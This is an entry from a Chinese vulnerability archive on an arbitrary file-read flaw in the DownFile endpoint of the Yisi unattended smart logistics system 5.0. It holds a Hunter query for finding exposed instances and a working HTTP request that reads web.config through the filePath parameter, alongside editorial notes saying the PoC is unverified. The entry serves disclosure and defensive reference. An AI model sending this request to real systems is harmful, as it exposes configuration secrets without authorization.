---
source: "wy876 漏洞文库"
title: "易思智能物流无人值守 DownFile web.config读取"
product: "易思智能物流无人值守"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "5.0声明"
prerequisites: "带session，是否业务登录未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yd8bodau0wlc1qrf"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9Fdownfile%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
hunter: "web.body==\"易思无人值守智能物流\""
id: "vw-e14bdf9311fa6bfe9ad917bf"
entity_id: "ve-e14bdf9311fa6bfe9ad917bf"
schema_version: "1"
previous_fofa_unverified: "web.body=="
---

# 易思智能物流无人值守 DownFile web.config读取

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：易思智能物流无人值守；DownFile web.config读取
- 版本、配置及部署条件：5.0声明
- 认证与权限前提：带session，是否业务登录未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同82，多5.0声明但无版本证据；鉴权不应直接从有无Cookie推
- Hunter误fofa、长产品AI机器人简介无来源应收敛
- 缺响应/根因/修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇易思智能物流无人值守系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。

## 二、影响版本
+ 易思智能物流无人值守系统5.0

## 三、资产测绘
+ hunter`web.body=="易思无人值守智能物流"`
+ 登录页面


## 四、漏洞复现
```http
GET /PublicInfoManage/Upload/DownFile?filePath=web.config  HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=c5z5wepqulqppvdagvif5dlv
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yd8bodau0wlc1qrf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
